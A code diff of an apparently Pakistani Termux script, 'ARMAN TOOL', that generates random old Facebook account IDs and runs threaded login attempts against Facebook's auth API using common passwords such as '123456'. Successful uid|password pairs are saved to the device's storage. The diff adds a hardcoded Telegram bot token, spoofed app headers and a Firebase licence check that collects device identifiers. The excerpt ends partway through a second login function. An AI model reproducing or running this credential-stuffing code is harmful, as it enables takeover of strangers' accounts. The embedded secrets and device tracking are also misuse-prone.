@@ -10,15 +10,13 @@ import sys
 import json
 import urllib
 import platform
-import warnings
 from bs4 import BeautifulSoup
 from random import randint as rr
 from concurrent.futures import ThreadPoolExecutor as tred
 from os import system
 from datetime import datetime, timedelta
 
-warnings.filterwarnings("ignore", category=SyntaxWarning)
-
+# Ensure required modules are installed
 modules = ['requests', 'urllib3', 'mechanize', 'rich']
 for module in modules:
     try:
@@ -31,37 +29,19 @@ from requests.exceptions import ConnectionError
 
 requests.urllib3.disable_warnings()
 
+# --- Configuration ---
 FIREBASE_URL = "https://arman-f9a3b-default-rtdb.firebaseio.com/"
 
-BOT_TOKEN = "8533770908:AAGpn4bIfoArEOyN7SjTskWnzIyGGjEPOoc"
-TELEGRAM_USER = "7111707713"
-
-def check_update():
-    try:
-        url = "https://arman-f9a3b-default-rtdb.firebaseio.com/123/Version.json"
-        response = requests.get(url, timeout=5)
-        server_version = response.json()
-        
-        current_version = "15.3"
-        
-        if server_version and str(server_version).strip() != str(current_version).strip():
-            print("\n\x1b[38;5;196m========================================\033[0m")
-            print("\x1b[38;5;226m [!] New Version Available on Server!\033[0m")
-            print(f"\x1b[38;5;46m [✓] Updating Tool to Version: {server_version}\033[0m")
-            print("\x1b[38;5;51m [i] Please wait, downloading latest code...\033[0m")
-            print("\x1b[38;5;196m========================================\033[0m")
-            
-            os.system('git pull origin main > /dev/null 2>&1 || git pull > /dev/null 2>&1')
-            print("\n\x1b[38;5;46m[✓] Tool Updated Successfully! Restarting...\033[0m")
-            time.sleep(2)
-            os.execv(sys.executable, ['python'] + sys.argv)
-    except Exception:
-        pass
+# TELEGRAM CONFIGURATION
+BOT_TOKEN = "8974282237:AAEov6IiXxLPOJT6-yN3GLTmRE643-O-6DY"
+TELEGRAM_USER = "8568795915"
 
 def get_device_model():
+    """Android Brand aur Model اکٹھا حاصل کرنے کا طریقہ"""
     try:
         brand = os.popen("getprop ro.product.brand").read().strip().capitalize()
         model = os.popen("getprop ro.product.model").read().strip()
+        
         if brand and model:
             if brand.lower() in model.lower():
                 return model
@@ -75,43 +55,52 @@ def get_device_model():
     return "Unknown Device"
 
 def get_android_version():
+    """Android Version حاصل کرنے کا طریقہ"""
     try:
         return os.popen("getprop ro.build.version.release").read().strip() or "Unknown"
     except Exception:
         return "Unknown"
 
 def get_hwid():
+    """100% یونیک ڈیوائس آئی ڈی جو ہر فون کی الگ اور بالکل محفوظ ہوگی"""
     try:
         brand = os.popen("getprop ro.product.brand").read().strip()
         model = os.popen("getprop ro.product.model").read().strip()
         device = os.popen("getprop ro.product.device").read().strip()
+        
         if brand or model or device:
             combined = f"{brand}_{model}_{device}"
             if len(combined.strip("_")) > 2:
                 return combined
     except Exception:
         pass
+    
     try:
         android_id = os.popen("settings get secure android_id").read().strip()
         if android_id and android_id != "null":
             return f"AND_ID_{android_id}"
     except Exception:
         pass
+        
     try:
         return platform.node() + "_" + platform.machine()
     except Exception:
         return "ARMAN_DEVICE_" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
 
 def record_user_daily_usage(user_key):
+    """یوزر کی روزانہ کی یوزیج ہسٹری فائر بیس پر سیو کرنے کا فنکشن"""
     try:
         today_date = datetime.now().strftime("%Y-%m-%d")
         usage_path = f"{FIREBASE_URL}keys/{user_key}/daily_usage/{today_date}.json"
+        
         res = requests.get(usage_path, timeout=3)
         current_count = res.json()
+        
         if current_count and isinstance(current_count, int):
             new_count = current_count + 1
         else:
             new_count = 1
+            
         requests.put(usage_path, json=new_count, timeout=3)
     except Exception:
         pass
@@ -137,18 +126,17 @@ def send_login_alert(user_key, user_name, expiry_date):
         pass
 
 def calculate_time_left(expiry_str):
-    if not expiry_str:
-        return expiry_str
+    if expiry_str == "Lifetime":
+        return "Lifetime"
     try:
-        try:
+        if len(expiry_str) > 10:
             exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
-        except Exception:
+        else:
             exp_dt = datetime.strptime(expiry_str, "%Y-%m-%d")
         now = datetime.now()
         diff = exp_dt - now
         total_seconds = diff.total_seconds()
-        if total_seconds <= 0: 
-            return "Expired"
+        if total_seconds <= 0: return "Expired"
         total_hours = int(total_seconds // 3600)
         minutes = int((total_seconds % 3600) // 60)
         if total_hours < 24:
@@ -163,13 +151,13 @@ def calculate_time_left(expiry_str):
 def display_welcome_banner(user_name, user_key, time_left):
     os.system('clear')
     print(f"""
-\033[1;36m╔════════════════════════════════════════════╗
-║             🔥 ARMAN TOOL 🔥               ║
+\033[1;32m╔════════════════════════════════════════════╗
+║             ARMAN TOOL ACTIVE              ║
 ╠════════════════════════════════════════════╣
-║ 🇵🇰 ᴘᴛɪ       : ᴘᴛɪ ᴛɪɢᴇʀ                   ║
-║ 👑 ᴋʜᴀɴ ᴅɪᴡᴀɴᴀ: ᴅɪʟ ᴍᴀɪɴ ɪᴍʀᴀɴ ᴋʜᴀɴ         ║
-║ ⏳ ᴠᴀʟɪᴅɪᴛʏ  : {time_left:<27} ║
-║ ⚡ sʏsᴛᴇᴍ ᴋᴀ ʙᴀᴘ: ɪᴍʀᴀɴ ᴋʜᴀɴ               ║
+║ USER NAME    : {user_name:<27} ║
+║ LICENSED KEY : {user_key:<27} ║
+║ VALIDITY     : {time_left:<27} ║
+║ SYSTEM STATUS: ONLINE & READY              ║
 ╚════════════════════════════════════════════╝\033[0m
 """)
 
@@ -181,7 +169,6 @@ def hold_screen_10_seconds():
     time.sleep(1)
 
 def check_key():
-    check_update()
     try:
         for m_node in ["maintenance.json", "maintenance_mode.json"]:
             m_res = requests.get(f"{FIREBASE_URL}{m_node}", timeout=5)
@@ -198,7 +185,7 @@ def check_key():
     try:
         if not os.path.exists("/data/data/com.termux"):
             import pathlib
-            saved_key_file = os.path.join(str(pathlib.Path.home()), ".arm_key.txt")
+            saved_key_file = os.path.join(str(pathlib.Path.home()), ".ahb_key.txt")
     except Exception:
         pass
         
@@ -222,9 +209,11 @@ def check_key():
             if key_data and isinstance(key_data, dict):
                 expiry_str = key_data.get('expiry')
                 saved_hwid = key_data.get('hwid')
+                
                 if saved_hwid in ("None", "", None):
                     requests.patch(f"{FIREBASE_URL}keys/{user_key}.json", json={'hwid': user_hwid})
                     saved_hwid = user_hwid
+
                 now_str = datetime.now().strftime("%Y-%m-%d %H:%M")
                 if expiry_str != "Lifetime" and expiry_str < now_str:
                     print("\n\033[1;31m[×] Your Key / Free Trial has Expired! Please buy a Paid Key.\033[0m")
@@ -245,15 +234,19 @@ def check_key():
             safe_hwid_node = user_hwid.replace(".", "_").replace("#", "_").replace("$", "_").replace("[", "_").replace("]", "_").replace("/", "_")
             trial_check_res = requests.get(f"{FIREBASE_URL}trial_logs/{safe_hwid_node}.json", timeout=10)
             already_took_trial = trial_check_res.json()
+            
             if already_took_trial is True:
                 pass
             else:
                 requests.put(f"{FIREBASE_URL}trial_logs/{safe_hwid_node}.json", json=True)
+                
                 trial_key = "TRL-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
                 expiry_date = (datetime.now() + timedelta(days=2)).strftime('%Y-%m-%d %H:%M')
                 customer_name = "Auto_Trial_User"
+                
                 device_model = get_device_model()
                 android_ver = get_android_version()
+                
                 payload = {
                     'name': customer_name,
                     'expiry': expiry_date,
@@ -264,46 +257,54 @@ def check_key():
                 }
                 requests.put(f"{FIREBASE_URL}keys/{trial_key}.json", json=payload)
                 send_login_alert(trial_key, customer_name, expiry_date)
+                
                 try:
                     with open(saved_key_file, "w") as f: 
                         f.write(trial_key)
                 except Exception:
                     pass
+                
                 print(f"\n\033[1;32m[✓] NEW USER 2 DAYS FREE APPROVAL 🔥\033[0m")
                 time.sleep(2)
                 user_key = trial_key
                 key_data = payload
                 is_valid = True
-        except Exception:
+        except Exception as e:
             pass
 
     if not is_valid:
         if os.path.exists(saved_key_file):
             try: os.remove(saved_key_file)
             except Exception: pass
+            
         os.system('clear')
-        print("""\033[1;33m
+        print(f"""\033[1;33m
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃               [!] ACCESS DENIED                 ┃
 ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
 ┃ YOUR FREE TRIAL HAS ENDED                       ┃
 ┃ Please contact ARMAN to get your Key!           ┃
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\033[0m""")
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m""")
+        
         customer_name = input("\033[1;33m[?] Enter Your Name: \033[0m").strip().upper()
-        if not customer_name: 
-            customer_name = "USER"
+        if not customer_name: customer_name = "USER"
+            
         user_key = input("\n\033[1;36m[?] Enter Your Key: \033[0m").strip().upper()
+
         try:
             res = requests.get(f"{FIREBASE_URL}keys/{user_key}.json", timeout=10)
             key_data = res.json()
             if key_data and isinstance(key_data, dict):
                 expiry_str = key_data.get('expiry')
                 saved_hwid = key_data.get('hwid')
+                
                 if saved_hwid and saved_hwid not in ("None", "") and saved_hwid != user_hwid:
                     print("\n\033[1;31m[×] Key is registered to another device!\033[0m")
                     sys.exit()
+                    
                 device_model = get_device_model()
                 android_ver = get_android_version()
+                
                 requests.patch(f"{FIREBASE_URL}keys/{user_key}.json", json={
                     'hwid': user_hwid, 
                     'name': customer_name,
@@ -312,6 +313,7 @@ def check_key():
                     'app_version': '1.0'
                 })
                 send_login_alert(user_key, customer_name, expiry_str)
+                
                 try:
                     with open(saved_key_file, "w") as f: 
                         f.write(user_key)
@@ -330,6 +332,31 @@ def check_key():
         return key_data.get("name", "USER"), user_key, key_data.get('expiry')
     return None
 
+if __name__ == '__main__':
+    result = check_key()
+    if result:
+        user_name, user_key, expiry_str = result
+        remaining_time = calculate_time_left(expiry_str)
+        display_welcome_banner(user_name, user_key, remaining_time)
+        hold_screen_10_seconds()
+        print("\033[1;32m[✓] Main Tool Started Successfully!\033[0m")
+
+os.system('clear')
+print(' \x1b[38;5;46mARMAN SERVER LOADING....')
+
+os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
+os.system('pip install httpx beautifulsoup4')
+print('loading Modules ...\n')
+os.system('clear')
+
+class sec:
+    def __init__(self):
+        self.__module__ = __name__
+        self.__qualname__ = 'sec'
+
+    def linex(self):
+        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
 method = []
 oks = []
 cps = []
@@ -340,18 +367,9 @@ X = '\x1b[1;37m'
 rad = '\x1b[38;5;196m'
 G = '\x1b[38;5;46m'
 Y = '\x1b[38;5;220m'
-PP = '\x1b[38;5;203m'
-RR = '\x1b[38;5;196m'
-GS = '\x1b[38;5;40m'
 W = '\x1b[1;37m'
 
 def window1():
-    fb_ua_list = [
-        "Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.25.115;]",
-        "Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.037) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FBAN/FBIOS;FBAV/425.0.0.12.34;]",
-        "Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Pro Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/428.0.0.32.109;]"
-    ]
     aV = str(random.choice(range(10, 20)))
     A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
     bV = str(random.choice(range(1, 36)))
@@ -365,62 +383,32 @@ def window1():
     latest_build = rr(6000, 9000)
     latest_patch = rr(100, 200)
     D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
-    return random.choice([A, B, C, D] + fb_ua_list)
-
-def get_smart_headers():
-    return {
-        'authority': 'm.facebook.com',
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'cache-control': 'max-age=0',
-        'dpr': '2',
-        'sec-ch-prefers-color-scheme': 'light',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-model': '"TECNO KM5"',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-ch-ua-platform-version': '"15.0.0"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        'viewport-width': '980',
-    }
-
-sys.stdout.write('\x1b]2;{ Arman 👑 }\x07')
+    return random.choice([A, B, C, D])
 
 def show_branding():
     if 'win' in sys.platform:
         os.system('cls')
     else:
         os.system('clear')
-    
-    print(r"""\033[1;32m
-      _    ____  ____  __  __    _    _   _ 
-     / \  |  _ \|  _ \|  \/  |  / \  | \ | |
-    / _ \ | |_) | |_) | |\/| | / _ \ |  \| |
-   / ___শিল্পী |  _ <|  _ <| |  | |/ ___শিল্পী | |\  |
-  /_/   \_\_| \_\_| \_\_|  |_/_/   \_\_| \_|
-\033[0m""")
+    print("""\033[1;32m
+      "      _    ____  ____  __  __    _    _   _ \n"
+      "     / \  |  _ \|  _ \|  \/  |  / \  | \ | |\n"
+      "    / _ \ | |_) | |_) | |\/| | / _ \ |  \| |\n"
+      "   / ___ \|  _ <|  _ <| |  | |/ ___ \| |\  |\n"
+      "  /_/   \_\_| \_\_| \_\_|  |_/_/   \_\_| \_|\n")░\033[0m""")
                
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mARMAN")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m▶  \033[1;97mALi")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFACEBOOK   \x1b[38;5;46m▶  \033[1;97mARMAN-TOOL")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mWHATSAPP   \x1b[38;5;46m▶  \033[1;97m03022745249")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mWHATSAP    \x1b[38;5;46m▶  \033[1;97m03052962654")
     print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mFEATURE    \x1b[38;5;46m▶  \033[1;97mOLD CLONING")
-    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m15.3")
+    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mVERSION    \x1b[38;5;46m▶  \033[1;97m12.3")
     print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")
 
 def ____banner____():
     show_branding()
 
 def creationyear(uid):
-    if uid.startswith(('1000000000', '1000000001')): return '2006'
-    if uid.startswith(('1000000002', '1000000003')): return '2007'
-    if uid.startswith(('1000000004', '1000000005')): return '2008'
     if len(uid) == 15:
         if uid.startswith('1000000000'): return '2009'
         if uid.startswith('100000000'): return '2009'
@@ -448,9 +436,6 @@ def creationyear(uid):
     elif len(uid) == 14 and uid.startswith('61'): return '2024'
     else: return ''
 
-def clear():
-    os.system('clear')
-
 def linex():
     print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
@@ -458,7 +443,7 @@ def BNG_71_():
     ____banner____()
     print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mOLD CLONE')
     linex()
-    __Jihad__ = input("       \x1b[38;5;41mCHOICE  " + W + ": " + Y)
+    __Jihad__ = input(f"       \x1b[38;5;41mCHOICE  {W}: {Y}")
     if __Jihad__ in ('A', 'a', '01', '1'):
         old_clone()
     else:
@@ -474,7 +459,7 @@ def old_clone():
     linex()
     print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;49m2009 series')
     linex()
-    _input = input("       \x1b[38;5;41mCHOICE  " + W + ": " + Y)
+    _input = input(f"       \x1b[38;5;41mCHOICE  {W}: {Y}")
     if _input in ('A', 'a', '01', '1'):
         old_One()
     elif _input in ('B', 'b', '02', '2'):
@@ -486,27 +471,28 @@ def old_clone():
         BNG_71_()
 
 def old_One():
+    global user
     user = []
     ____banner____()
-    print("       \x1b[38;5;49mOld Code " + Y + ":" + G + " 2010-2014")
-    ask = input("       \x1b[38;5;41mSELECT " + Y + ":" + G + " ")
+    print(f"       \x1b[38;5;49mOld Code {Y}:{G} 2010-2014")
+    ask = input(f"       \x1b[38;5;41mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mEXAMPLE " + Y + ":" + G + " 20000 / 30000 / 99999")
-    limit = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mSELECT " + Y + ":" + G + " ")
+    print(f"       \x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     star = '10000'
     for _ in range(int(limit)):
         data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
         user.append(data)
-    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
-    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
+    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 1')
+    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD 2')
     linex()
-    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
+    meth = input(f"       \x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ": " + G + " " + limit + W)
-        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT" + G)
+        print(f"       \x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for mal in user:
             uid = star + mal
@@ -519,14 +505,15 @@ def old_One():
                 break
 
 def old_Tow():
+    global user
     user = []
     ____banner____()
-    print("       \x1b[38;5;46mOLD CODE " + Y + ":" + G + " 2010-2014")
-    ask = input("       \x1b[38;5;46mSELECT " + Y + ":" + G + " ")
+    print(f"       \x1b[38;5;46mOLD CODE {Y}:{G} 2010-2014")
+    ask = input(f"       \x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print("       \x1b[38;5;46mEXAMPLE " + Y + ":" + G + " 20000 / 30000 / 99999")
-    limit = input("       \x1b[38;5;46mSELECT " + Y + ":" + G + " ")
+    print(f"       \x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     prefixes = ['100003', '100004']
     for _ in range(int(limit)):
@@ -537,11 +524,11 @@ def old_Tow():
     print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD A')
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD B')
     linex()
-    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
+    meth = input(f"       \x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ": " + G + " " + limit + W)
-        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT" + G)
+        print(f"       \x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
             if meth == 'A':
@@ -553,14 +540,15 @@ def old_Tow():
                 break
 
 def old_Tree():
+    global user
     user = []
     ____banner____()
-    print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mOLD CODE " + Y + ":" + G + " 2009-2010")
-    ask = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mSELECT " + Y + ":" + G + " ")
+    print(f"       \x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
+    ask = input(f"       \x1b[38;5;46mSELECT {Y}:{G} ")
     linex()
     ____banner____()
-    print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mEXAMPLE " + Y + ":" + G + " 20000 / 30000 / 99999")
-    limit = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT " + Y + ":" + G + " ")
+    print(f"       \x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
+    limit = input(f"       \x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
     linex()
     prefix = '1000004'
     for _ in range(int(limit)):
@@ -570,11 +558,11 @@ def old_Tree():
     print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMETHOD A')
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;46mMethod B')
     linex()
-    meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
+    meth = input(f"       \x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK " + Y + ":" + G + limit + W)
-        print("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT" + G)
+        print(f"       \x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
+        print(f"       \x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
             if meth == 'A':
@@ -589,7 +577,7 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m(\x1b[1;37mARMAN-M1\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mARMAN-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -615,15 +603,28 @@ def login_1(uid):
                 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                 'api_key': '882a8490361da98702bf97a021ddc14d'
             }
-            headers = get_smart_headers()
+            # Updated Headers with HttpCanary values
+            headers = {
+                'Host': 'hdr.fb.com',
+                'User-Agent': 'Facebook',
+                'Accept-Encoding': 'gzip, deflate',
+                'X-FB-HTTP-Engine': 'Tigon/Liger',
+                'x-fb-client-ip': 'True',
+                'x-fb-server-cluster': 'True',
+                'X-ZERO-F-DEVICE-ID': 'e3ee80f4-5c83-4468-a22f-b68b47900055',
+                'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
+                'app-scope-id-header': 'dc767d06-3846-48ce-848c-6bb47662f3f7',
+                'x-fb-conn-uuid-client': 'sbQ1GdhKzcTild6k56CNYA==',
+                'Connection': 'keep-alive'
+            }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/ARMAN-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r(\x1b[1;37mARMAN\x1b[38;5;196m) = \x1b[38;5;46m{uid} = \x1b[38;5;46m{pw} = \x1b[38;5;45m{creationyear(uid)}")
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/ARMAN-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
@@ -633,33 +634,35 @@ def login_1(uid):
 
 def login_2(uid):
     global loop
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+(\x1b[1;37mARMAN-M2\x1b[38;5;196m)(\x1b[38;5;192m{loop}\x1b[38;5;196m)(\x1b[1;37mOK\x1b[38;5;196m)(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mARMAN-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
             with requests.Session() as session:
-                headers = get_smart_headers()
